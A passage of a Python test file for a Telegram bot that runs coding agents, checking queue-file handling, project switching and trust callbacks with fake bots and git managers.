    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    path = router._next_queue_file_path(123)
    assert "-queue-0.txt" in path.name


def test_clear_chat_message_queue_removes_processing_and_pending_files(tmp_path: Path):
    """_clear_chat_message_queue must unlink processing and pending files (lines 249-254)."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    # Create actual queue files in the expected location
    queue_dir = router._queue_dir(123)
    queue_dir.mkdir(parents=True, exist_ok=True)

    processing_file = queue_dir / "session-processing.txt"
    processing_file.write_text("[Question 1]\nhello\n[End Question 1]\n")
    router._chat_processing_queue_files[123] = processing_file

    pending_file = queue_dir / "session-pending.txt"
    pending_file.write_text("[Question 1]\nhello\n[End Question 1]\n")
    from types import SimpleNamespace as SN
    router._chat_pending_queue_decisions[123] = (pending_file, [])

    router._clear_chat_message_queue(123)

    # Files should be gone or not tracked
    assert 123 not in router._chat_processing_queue_files
    assert 123 not in router._chat_pending_queue_decisions


def test_prompt_continue_queued_questions_skips_when_no_send_message(tmp_path: Path):
    """_prompt_continue_queued_questions returns early (line 189) when bot lacks send_message."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    context = SimpleNamespace(bot=SimpleNamespace())  # no send_message attribute

    asyncio.run(router._prompt_continue_queued_questions(123, context))
    # Should not raise


def test_prompt_queue_batch_decision_skips_when_no_send_message(tmp_path: Path):
    """_prompt_queue_batch_decision returns early (line 211) when bot lacks send_message."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    from coding_agent_telegram.router.queue_processing import QueuedQuestion
    context = SimpleNamespace(bot=SimpleNamespace())  # no send_message attribute

    asyncio.run(router._prompt_queue_batch_decision(
        123,
        context,
        [QueuedQuestion(text="hello", reply_to_message_id=None)],
    ))
    # Should not raise


# ===========================================================================
# project_commands.py — project with active session in different project (line 292)
# ===========================================================================


def test_project_command_includes_active_session_info_when_project_changes(tmp_path: Path):
    """handle_project must extend intro_lines (line 292) with active session details
    when switching to a different project while an active session is in another project."""
    backend1 = tmp_path / "backend1"
    backend1.mkdir()
    backend2 = tmp_path / "backend2"
    backend2.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Active session is for backend1
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend1", "codex")
    store.set_current_project_folder("bot-a", 123, "backend1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main"])

    # Switch to backend2 (different project)
    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend2"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    # Should show branch selection prompt (git repo + switched project)
    assert bot.messages or bot.sent_messages


# ===========================================================================
# project_commands.py — project with branch_name set (non-git or same project) (line 307)
# ===========================================================================


def test_project_command_shows_confirmation_when_branch_is_set(tmp_path: Path):
    """handle_project must send confirmation (line 307) when branch_name is set
    (non-git-repo or same project, branch already selected)."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Set up: current project is same, branch is set in state
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_branch("bot-a", 123, "main")
    store.trust_project("backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # Non-git repo with branch_name from state
    router.git = FakeGitManager(is_git_repo=False, current_branch="main")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    # Should show project confirmation with branch info
    assert bot.messages or bot.sent_messages
    assert any("project" in msg[1].lower() or "branch" in msg[1].lower() for msg in bot.messages + [(0, m, 0, 0) for m in []])


# ===========================================================================
# project_commands.py — trust callback query is None (line 352)
# ===========================================================================


def test_trust_project_callback_returns_when_query_is_none(tmp_path: Path):
    """handle_trust_project_callback must return silently (line 352) when query is None."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=None,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))
    assert bot.messages == []


# ===========================================================================
# queue_processing.py — remaining edge cases (lines 72, 307-311, 339-341, 366, 377)
# ===========================================================================


def test_read_queue_questions_skips_empty_body(tmp_path: Path):
    """_read_queue_questions must skip questions with empty body (line 72)."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    queue_dir = router._queue_dir(123)
    queue_dir.mkdir(parents=True, exist_ok=True)
    queue_file = queue_dir / "test-queue-0.txt"
    # Write a question with empty body (blank line between headers)
    queue_file.write_text(
        "[Question 1]\n\n[End Question 1]\n",
        encoding="utf-8",
    )

    result = router._read_queue_questions(queue_file)
    assert result == []


def test_drain_chat_message_queue_skips_when_already_draining(tmp_path: Path):
    """_drain_chat_message_queue must return immediately (lines 321-322) when already draining."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    # Mark chat as draining
    router._chat_message_queue_draining.add(123)

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router._drain_chat_message_queue(123, context))
    # Should return immediately without doing anything
    assert bot.messages == []

    # Clean up
    router._chat_message_queue_draining.discard(123)


# ===========================================================================
# project_commands.py — handle_project confirmation with branch (line 307)
# ===========================================================================


def test_project_command_shows_html_confirmation_for_same_git_project_with_branch(tmp_path: Path):
    """handle_project sends HTML confirmation (line 307) when selecting the same
    git repo project where a branch is already detected."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Same project already selected, with trust so no trust prompt
    store.set_current_project_folder("bot-a", 123, "backend")
    store.trust_project("backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", default_branch="main", local_branches=["main"])

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    # Should show HTML project confirmation message (not branch selection)
    assert bot.messages or bot.sent_messages


# ===========================================================================
# queue_processing.py — dispatch and drain uncovered edge cases
# ===========================================================================


def test_dispatch_queued_questions_returns_false_when_continue_fails(tmp_path: Path):
    """Lines 307-311: _dispatch_queued_questions returns False when _continue_pending_action fails."""
    from coding_agent_telegram.router.queue_processing import QueuedQuestion
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    qf = tmp_path / "q.txt"
    qf.write_text("", encoding="utf-8")

    async def always_false(*a, **kw):
        return False

    router._continue_pending_action = always_false

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    result = asyncio.run(router._dispatch_queued_questions(
        123,
        context,
        queue_file=qf,
        queued_messages=[QueuedQuestion(text="hi")],
        grouped=False,
    ))
    assert result is False
    # queue_file should be put back at front of queue
    assert 123 in router._chat_message_queue_files


def test_drain_queue_prompts_continue_with_processing_file_cleanup(tmp_path: Path):
    """Lines 339-341: when aborted + processing_file exists, it is cleaned up."""
    from collections import deque
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    qf_pending = tmp_path / "pending.txt"
    router._append_question_to_queue_file(qf_pending, "queued question")
    router._chat_message_queue_files[123] = deque([qf_pending])

    processing_f = tmp_path / "processing.txt"
    processing_f.write_text("", encoding="utf-8")
    router._chat_processing_queue_files[123] = processing_f
    router._last_run_results[123] = SimpleNamespace(error_code="agent_aborted")

    sent = []

    async def fake_send_message(**kwargs):
        sent.append(kwargs)

    bot = SimpleNamespace(send_message=fake_send_message)
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))

    assert sent  # prompt was sent
    assert 123 not in router._chat_processing_queue_files  # cleaned up


def test_drain_queue_stops_dispatch_returns_false_single_message(tmp_path: Path):
    """Line 366: drain stops when single-message dispatch returns False."""
    from collections import deque
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    qf = tmp_path / "q.txt"
    router._append_question_to_queue_file(qf, "queued question")
    router._chat_message_queue_files[123] = deque([qf])

    async def always_false(*a, **kw):
        return False

    router._dispatch_queued_questions = always_false

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))  # should return without error


def test_drain_queue_stops_dispatch_returns_false_batch_single_mode(tmp_path: Path):
    """Line 377: drain stops when batch_mode='single' dispatch returns False."""
    from collections import deque
    from coding_agent_telegram.router.queue_processing import QueuedQuestion
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    qf = tmp_path / "q.txt"
    router._append_question_to_queue_file(qf, "question 1")
    router._append_question_to_queue_file(qf, "question 2")
    router._chat_message_queue_files[123] = deque([qf])
    router._chat_queue_batch_modes[123] = "single"  # forces single dispatch path

    async def always_false(*a, **kw):
        return False

    router._dispatch_queued_questions = always_false

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))  # should return without error
